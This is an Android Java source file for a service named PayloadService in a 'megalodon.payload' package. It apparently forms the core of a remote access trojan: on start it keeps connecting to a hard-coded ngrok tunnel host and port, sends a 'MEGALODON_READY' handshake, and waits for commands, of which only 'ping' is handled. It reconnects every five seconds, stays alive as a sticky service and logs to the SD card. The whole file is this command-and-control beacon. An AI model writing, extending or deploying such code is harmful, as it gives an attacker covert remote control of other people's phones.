package com.megalodon.payload;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileWriter;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class PayloadService extends Service {
    private static final String IP = "0.tcp.in.ngrok.io";
    private static final int PORT = 29805;
    private static final String LOG = "/sdcard/megalodon_debug.txt";

    private Socket socket;
    private DataInputStream in;
    private DataOutputStream out;
    private volatile boolean running = true;

    private void log(String msg) {
        Log.d("Megalodon", msg);
        try {
            FileWriter fw = new FileWriter(new File(LOG), true);
            String ts = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
            fw.write("[" + ts + "] SVC: " + msg + "\n");
            fw.close();
        } catch (Exception e) {}
    }

    @Override
    public void onCreate() {
        super.onCreate();
        log("Service onCreate");
        new Thread(new Runnable() {
            @Override
            public void run() {
                log("Thread started");
                connectLoop();
            }
        }).start();
    }

    private void connectLoop() {
        while (running) {
            try {
                log("Connecting to " + IP + ":" + PORT);
                socket = new Socket(IP, PORT);
                socket.setTcpNoDelay(true);
                socket.setKeepAlive(true);
                log("CONNECTED");

                in = new DataInputStream(socket.getInputStream());
                out = new DataOutputStream(socket.getOutputStream());

                out.writeUTF("MEGALODON_READY");
                out.flush();
                log("Handshake sent");

                while (running && !socket.isClosed()) {
                    try {
                        String cmd = in.readUTF();
                        log("Command: " + cmd);
                        if (cmd.equals("ping")) {
                            out.writeUTF("PONG");
                            out.flush();
                            log("PONG sent");
                        }
                    } catch (Exception e) {
                        log("Read error: " + e.getMessage());
                        break;
                    }
                }
            } catch (Exception e) {
                log("Connect error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            } finally {
                try { if (socket != null) socket.close(); } catch (Exception e) {}
                socket = null;
                log("Socket closed, will retry in 5s");
            }

            if (running) {
                try { Thread.sleep(5000); } catch (InterruptedException e) {}
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        log("onStartCommand called");
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        log("Service onDestroy");
        running = false;
        try { if (socket != null) socket.close(); } catch (Exception e) {}
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
